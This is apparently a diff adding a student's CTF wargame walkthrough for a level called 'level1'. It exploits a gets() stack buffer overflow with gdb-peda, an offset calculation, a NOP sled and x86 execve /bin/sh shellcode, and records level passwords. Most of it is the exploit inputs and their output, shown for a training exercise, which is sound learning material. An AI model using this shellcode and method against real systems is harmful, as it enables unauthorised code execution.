@@ -1,0 +1,94 @@
+login : pw
+	level1 : 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+
+gdb level1
+
+disas main
+	0x08048490 <+16>:	call   0x8048340 <gets@plt>
+		=> man gets
+			=> Never use this function.
+			=> No check for buffer overrun is  performed
+
+	0x08048486 <+6>:	sub    esp,0x50
+		=> stack allocation = int(0x50) = 80
+
+scp -P 4242 level1@192.168.1.20:./level1 .
+
+bash gdb-peda.sh
+	pattern create 100
+		=> Margin
+	run
+		paste pattern
+			=> segfault: EIP: 0x41344141 ('AA4A')
+	pattern offset AA4A
+		=> AA4A found at offset: 76
+			=> We have what we need, go back to target machine
+
+Get shell code (shell-storm => linux/x86):
+	=> http://shell-storm.org/shellcode/files/shellcode-219.php
+		=> "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+			=> size = 55 bytes
+
+Use python2 to generate input file as print input is binary data compared to python3 which is unicoded
+	=> python3 can only handle 0 <= c <= 127
+		=> sys.stdout.buffer.write if only python3 available
+
+"\x90" is the standard value for NOP (No Operation instruction)
+
+1st attempt:
+	python -c 'print "a" * 72 + "bbbb" + "cccc"' > /tmp/a
+	run < /tmp/a
+		=> segfault (0x63636363)
+	x/28xw $esp-(80+16)
+		=> Start address = 0xbffff5f0
+		=> rbp address = 0xbffff638
+		=> rip address = 0xbffff63c
+
+	python -c 'print "\x90" * (72 - 55) + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "bbbb" + "cccc"' > /tmp/a
+	run < /tmp/a
+		=> segfault (0x63636363)
+	No ASLR/No Pie
+		=> Start address remains constant
+
+	Pick an address slightly after the start address
+		=> Reverse it as it's little endian, least significant bit first
+			=> "\xf4\xf5\xff\xbf"
+
+	python -c 'print "\x90" * (72 - 55) + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "bbbb" + "\xf4\xf5\xff\xbf"' > /tmp/a
+	
+	run < /tmp/a
+		=> segfault (0xb4b7daf0)
+			=> This address should not be reached
+		=> Check start address
+	x/28xw 0xbffff5f0
+		=> Injected buffer was not altered
+		=> rbp and rip address were somehow altered
+
+2nd attempt:
+	May I overwrite everything ?
+	
+	python -c 'print "a" * 76 + "cccc" + "d" * 200' > /tmp/a
+	run < /tmp/a
+		=> segfault (0x63636363)
+	x/70xw 0xbffff5f0
+		=> Overwritten
+		=> Future nopslep start address = 0xbffff640
+	
+	python -c 'print "a" * 76 + "\x4f\xf6\xff\xbf" + "\x90" * 100 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' > /tmp/a
+		=> process 9702 is executing new program: /bin/dash
+		=> $ whoami
+			=> level1
+				=> gdb runs in a virtual environment, suid and guid arent applied
+
+	./level1 < /tmp/a
+		=> whoami
+			=> level2
+		=> cat /home/user/level2/.pass
+			=> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+		=> For some reason it doesnt work outside of gdb if rbp is not full of 'a'
+
+source.c
+	=> Array size = 72
+		=> offset at 76
+		=> total bytes = 76 + 4 = 80
+		=> 80 - sizeof(pushed(ebp)) - sizeof(nest instruction address) = 72
